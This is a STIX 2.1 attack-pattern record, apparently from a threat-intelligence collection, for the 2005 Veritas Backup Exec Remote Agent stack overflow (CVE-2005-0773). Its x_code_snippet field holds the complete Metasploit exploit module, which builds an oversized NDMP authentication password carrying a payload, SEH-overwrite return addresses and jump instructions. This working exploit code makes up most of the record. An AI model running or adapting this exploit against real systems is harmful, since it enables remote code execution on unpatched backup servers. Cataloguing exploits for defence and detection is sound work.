{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--45b73621-9581-4683-a9d0-08eae5f8bbf3",
    "created": "2024-08-14T16:50:13.785482Z",
    "modified": "2024-08-14T16:50:13.785486Z",
    "name": "Veritas Backup Exec Windows Remote Agent Overflow",
    "description": " This module exploits a stack buffer overflow in the Veritas BackupExec Windows Agent software. This vulnerability occurs when a client authentication request is received with type '3' and a long password argument. Reliable execution is obtained by abusing the stack buffer overflow to smash a SEH pointer. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/backupexec/remote_agent.rb",
            "external_id": "remote_agent.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2005-0773"
        },
        {
            "source_name": "reference",
            "url": "http://www.idefense.com/application/poi/display?id=272&type=vulnerabilities"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::NDMP\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Veritas Backup Exec Windows Remote Agent Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in the Veritas\n        BackupExec Windows Agent software. This vulnerability occurs\n        when a client authentication request is received with type\n        '3' and a long password argument. Reliable execution is\n        obtained by abusing the stack buffer overflow to smash a SEH\n        pointer.\n      },\n      'Author'         => [ 'hdm' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2005-0773'],\n          [ 'OSVDB', '17624'],\n          [ 'BID', '14022'],\n          [ 'URL', 'http://www.idefense.com/application/poi/display?id=272&type=vulnerabilities']\n        ],\n      'Privileged'     => true,\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 1024,\n          'BadChars' => \"\\x00\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => %w{ win },\n      'Targets'        =>\n        [\n          [\n            'Veritas BE 9.0/9.1/10.0 (All Windows)',\n            {\n              'Platform' => 'win',\n              'Rets'     => [ 0x0140f8d5, 0x014261b0 ],\n            },\n          ],\n          [\n            'Veritas BE 9.0/9.1/10.0 (Windows 2000)',\n            {\n              'Platform' => 'win',\n              'Rets'     => [ 0x75022ac4, 0x75022ac4 ],\n            },\n          ],\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2005-06-22'))\n\n    register_options(\n      [\n        Opt::RPORT(10000)\n      ])\n  end\n\n  def check\n    info = ndmp_info()\n    if (info and info['Version'])\n      vprint_status(\" Vendor: #{info['Vendor']}\")\n      vprint_status(\"Product: #{info['Product']}\")\n      vprint_status(\"Version: #{info['Version']}\")\n\n      if (info['Vendor'] =~ /VERITAS/i and info['Version'] =~ /^(4\\.2|5\\.1)$/)\n        return Exploit::CheckCode::Appears\n      end\n    end\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    connect\n\n    print_status(\"Trying target #{target.name}...\")\n\n    resp = ndmp_recv()\n\n    username = 'X' * 512\n    password = rand_text_alphanumeric(8192)\n\n    # Place our payload early in the request and jump backwards into it\n    password[ 3536 - payload.encoded.length, payload.encoded.length] = payload.encoded\n\n    # This offset is required for version 10.0\n    password[3536, 2] = \"\\xeb\\x06\"\n    password[3540, 4] = [ target['Rets'][1] ].pack('V')\n    password[3544, 5] = \"\\xe9\" + [-1037].pack('V')\n\n    # This offset is required for version 9.0/9.1\n    password[4524, 2] = \"\\xeb\\x06\"\n    password[4528, 4] = [ target['Rets'][0] ].pack('V')\n    password[4532, 5] = \"\\xe9\" + [-2025].pack('V')\n\n    # Create the authentication request\n    auth = [\n        1,               # Sequence number\n        Time.now.to_i,   # Current time\n        0,               # Message type (request)\n        0x901,           # Message name (connect_client_auth)\n        0,               # Reply sequence number\n        0,               # Error status\n        3                # Authentication type\n      ].pack('NNNNNNN') +\n      [ username.length ].pack('N') + username +\n      [ password.length ].pack('N') + password +\n      [ 4 ].pack('N')\n\n    print_status(\"Sending authentication request...\")\n    ndmp_send(auth)\n\n    # Attempt to read a reply (this should fail)\n    ndmp_recv()\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2005-06-22",
    "x_mitre_platforms": [
        "win'"
    ]
}